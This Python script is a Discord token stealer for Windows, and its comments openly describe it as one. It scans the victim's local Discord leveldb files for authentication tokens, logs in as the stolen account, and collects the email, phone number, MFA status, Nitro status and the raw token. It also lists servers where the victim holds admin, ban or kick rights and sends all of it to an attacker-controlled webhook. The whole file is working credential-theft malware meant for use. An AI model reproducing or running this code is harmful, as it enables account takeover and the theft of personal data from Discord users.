#MADE BY HUMANOT
#WORKS FOR WINDOWS ONLY

#imports
import os
import discord
import base64
import requests
from base64 import *
from dhooks import *
from re import findall
from discord.ext import commands
#colors
coloryes = 0x2ecc71
colorno = 0xe74c3c
#discord client
client = discord.Client()
client = commands.Bot(description='github.com/hum4not', command_prefix="notrequired", self_bot=True)
#webhook(change url to ur one)
webhook = "ur webhook"
#client event (do things when logged in as stolen account)
@client.event
async def on_ready():
    await Details()
#false login message
def FalseLogin(webhookx):
    webhookx = Webhook(webhook)
    e = Embed(
        title = "**FALSE LOGIN**",
        description = f"\n```UID: FALSE```\n```UserName: FALSE```\n```Status: INCORRECT TOKEN DETECTED```",
        color = colorno
    )
    e.set_thumbnail(url="https://media.discordapp.net/attachments/896404030375481374/899700003000422430/441-4415488_lock-icon-png-transparent-png.png?width=533&height=676")
    webhookx.send(embed=e)
#login part(DONT FUCKING REMOVE)
def LOGIN(tokenx):
    try:
        token = tokenx
        client.run(token, bot=False, reconnect=True)
    except discord.errors.LoginFailure:
        FalseLogin(webhookx=webhook)
#sends list of admin servers etc
async def sendservers():
    webhookx = Webhook(webhook)
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in client.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    e = Embed(
        
        title = "**SERVERS**",
        description = f"**Servers with Admin ({len(admins)}):**\n```{admins}```",
        color = coloryes
    )
    e2 = Embed(
        
        title = "**BOT_ADD**",
        description = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n```{bots}```",
        color = coloryes
    )
    e3 = Embed(
        
        title = "**MEMBERS.BAN**",
        description = f"\n**Servers with Ban Permission ({len(bans)}):**\n```{bans}```",
        color = coloryes
    )
    e4 = Embed(
        
        title = "**MEMBERS.KICK**",
        description = f"\n**Servers with Kick Permission ({len(kicks)}:**\n```{kicks}```",
        color = coloryes
    )
    webhookx = Webhook(webhook)
    webhookx.send(embed=e)
    webhookx.send(embed=e2)
    webhookx.send(embed=e3)
    webhookx.send(embed=e4)
    exit()
#sends account's main details
async def Details():
    webhookx = Webhook(webhook)
    headers = {
        'Authorization': data,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']

        avatar_id = res['avatar']
    except KeyError:
        headers = {
            'Authorization': "Bot " + data,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']

            avatar_id = res['avatar']
            em = discord.Embed(
                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nTOKEN: `{data}`")
                
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale']},
                {'name': 'Verified', 'value': res['verified']},
            ]
            
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
                    em.color = coloryes
                    
            webhookx.send(embed=em)
            await sendservers()
        except KeyError:
            pass

    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nTOKEN: `{data}`")
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Local language', 'value': res['locale']},
        {'name': 'MFA', 'value': res['mfa_enabled']},
        {'name': 'Verified', 'value': res['verified']},
        {'name': 'Nitro', 'value': nitro_type},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            em.color = coloryes
        webhookx.send(embed=em)
        await sendservers()
#gets the token
def Init():
        ROAMING = os.getenv("APPDATA")
        PATHS = {"Discord": ROAMING + "\\Discord",}
            
        def gettokens(path):
            path += "\\Local Storage\\leveldb"
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
            return tokens


        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue
            for token in gettokens(path):
                if not token.startswith("mfa."):
                    try:
                        uid = b64decode(token.split(".")[0].encode()).decode()
                        global data
                        data = ""
                        data += token
                    except:
                        pass
              
            LOGIN(tokenx=token)  
        
#launches program
if __name__ == "__main__":
    Init()
